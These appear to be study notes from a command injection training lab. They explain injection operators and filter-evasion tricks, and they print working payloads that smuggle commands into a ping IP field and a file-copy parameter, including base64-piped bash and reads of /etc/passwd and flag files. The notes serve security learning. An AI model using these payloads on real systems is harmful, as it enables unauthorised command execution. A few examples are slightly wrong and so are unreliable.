# Intro To Command Injection

Command Injections are a high-impact vulnerability that leads directly to system cmmand execution.

An example of this is PHP functions which might pass input to a dangerous function, like ```exec, system, shell_exec, passthru, or popen```, NodeJS can also have vulnerable functions in ```child_process.exec or child_process.spawn```

# Detection

A textbook example is an admin utility on a website used to to ping a server selected by the user, where you enter an IP address and the ping command is executed. This is vulnerable to command injection. We can enter ```127.0.0.1; whoami``` for example.

# Injecting Commands

In the case here, the simple payload does not work. We can see that the validation is being done on the front end (there is no payload being sent to a backend server, therefore everything is done on the front end).

One of the simplest things we can do is to capture the POST requst, and take our payload ```127.0.0.1; whoami``` and URL encode it to ip=```127.0.0.1%3b+whoami```

# Other Injection Operators

There are many operators in Linux for chaining commands, like
```
&&
|| (OR operator, requires first command to be invalid)
&
|
;
```

And general command injection operators:
```
SQL Injection 	' , ; -- /* */
Command Injection 	; &&
LDAP Injection 	* ( ) & |
XPath Injection 	' or and not substring concat count
OS Command Injection 	; & |
Code Injection 	' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal/File Path Traversal 	../ ..\\ %00
Object Injection 	; & |
XQuery Injection 	' ; -- /* */
Shellcode Injection 	\x \u %u %n
Header Injection 	\n \r\n \t %0d %0a %09
```

# Identifying Filters

To critically understand what a firewall is blocking, we have to break our input into "parts"

For example
```127.0.0.1; whoami``` gets filtered, but ```127.0.0.1``` does not. Therefore, the filter must be triggered on the following: ```; whoami```, triggering on either a semicolon, space, or the command.

We can try entering each of these one at a time, for example, let us try inputting

```127.0.0.1;```

Which gets filtered.

# Bypassing Space Filters

Spaces are commonly blacklisted, since they are a risky character. We can try using some of the following characters:
```
tab (%09)
Linux Enviroment Variable $IFS
Bash Brace Expansion ( {ls,-la} )
```

We had to use
```
127.0.0.1%0A{ls,-la}
``` 
to complete this section. Note that %OA is a newline, but URL encoded.

# Bypassing Other Blacklisted Characters

Slashes and backslashes may be commonly backlisted.

We can avoid this by grabbing a substring {0:1} of $PATH, since every PATH begins with a slash, like so. We can also use this for other characters like a semicolon.
```
LINUX
echo ${PATH:0:1} == /
echo ${LS_COLORS:10:1} == ;

WINDOWS
echo %HOMEPATH:~6,-11% == /
```

We can also character shift to produce characters, often taking the ASCII number before the charactrer we want, and adding 1.
```
echo $(tr '!-}' '"-~'<<<[) == \
```
This will take the [, add 1 to it, and evaluate to the ASCII code of \

This one was tricky.

```
127.0.0.1%0als${IFS}${PATH:0:1}home
```
Is the expected solution. Let's break it down
```
127.0.0.1%0a == end the expected input, begin our command injection
s${IFS} == evaluate to ls and a space (ls )
${PATH:0:1}home == evaluates to /home, bypassing the filter
```

# Bypassing Blacklisted Commands

Sometimes, words/commands will just be straight up blacklisted.
The easiest bypass is quotes, single or double.
```
w"ho"am"i" 
w'h'oam'i"
```
Note that the quotes must have an even amount, and be matching (odd number of quotes is a syntax error)

## Linux
We can do the same with backslashes, and the character $@
```
wh/oam/i
wh$@oa$@mi
```

## Windows

^ is ignored and causes typical evaluation
```
who^ami
```

## Questions

```127.0.0.1%0ac"a"t${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt```

Same as the previous payload, except we extend ```/home``` to be ```/home/1nj3c70r/flag.txt```, and we change ls to cat, but cat is blacklisted, so we use ```c"a"t``` to bypass the filter.

# Advanced Command Obfuscation

Case manipulation involves using different hcaracter cases to bypass a filter. Windows is easy in this regard (Windows does not care about case-sensitive commands), but Linux/bash shell are case sensitive. So we have to make a function that evaluates a command to be all lowercase, like so

```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

Reversed commands can also be executed

```
echo 'whoami' | rev == evaluates to imaohw
$(rev<<<'imaohw')
```

We can also execute base64 encoded commands, which allows us to bypass a lot of filters, since base64 is alphanumeric gibberish, with little special characters.


```
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
``` 
Encode a string with base64

`base64 -d <<< bHMgLWwgLwo= | sh` 
`bash<<<$(base64 -d<<<d2hvYW1p)`
Execute b64 encoded string

Even if some commands were filtered, like bash or base64, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like sh for command execution and openssl for b64 decoding, or xxd for hex decoding.

Thought process for the question here is as follows:
encode desired base64 command -> grab a linux command to execute the base64 encoded command -> throw it into the payload and bypass the filters

Let's start with seeing if we can execute base64 encoded whoami.

```
ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<d2hvYW1p)
```

We used `bash<<<$(base64 -d<<<d2hvYW1p)`
Now, we encode the desired command from the challenge.
```
ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEg)
``` 
Our final payload works.

# Evasion Tools

To obfuscate bash commands

https://github.com/Bashfuscator/Bashfuscator 

Use like so
```
./bashfuscator -c 'cat /etc/passwd'
```
Can produce a long payload, so we use some flags to produce a simpler command.
```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

We can execute the encoded command via ```bash -c``` 

https://github.com/danielbohannon/Invoke-DOSfuscation

Lets us do the same thing with Windows.

# Command Injection Prevention

Input validation (both on front-end and back-end), input sanitisization (removing non-nessesary characters)

We should also configure our server properly 
```

    Use the web server's built-in Web Application Firewall (e.g., in Apache mod_security), in addition to an external WAF (e.g. Cloudflare, Fortinet, Imperva..)

    Abide by the Principle of Least Privilege (PoLP) by running the web server as a low privileged user (e.g. www-data)

    Prevent certain functions from being executed by the web server (e.g., in PHP disable_functions=system,...)

    Limit the scope accessible by the web application to its folder (e.g. in PHP open_basedir = '/var/www/html')

    Reject double-encoded requests and non-ASCII characters in URLs

    Avoid the use of sensitive/outdated libraries and modules (e.g. PHP CGI)
```

# Skills Assessment

We given a file manager and told to find RCE on it. The RCE is on copying/moving files, you can inject into the "to" parameter. You end the current command, and then inject your command.

Let's keep the payload simple,

```
cat /flag.txt
```
/ is probably filtered, so we use a replacement.
we should also base64 our command to bypass any obvious filters
```
echo -n 'cat ${PATH:0:1}flag.txt' | base64
```
the command to execute looks like this:
```
bash<<<$(base64 -d <<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=)
```
but it needs to come after some operators, and we find that || will work for our purposes, so the payload is
```
||bash<<<$(base64 -d <<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=)
```

This needs to go into a URL, so we do some encoding.

```
%7c%7cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=)
```

Is our final payload. We put it into the to parameter when copying a file, and get our flag.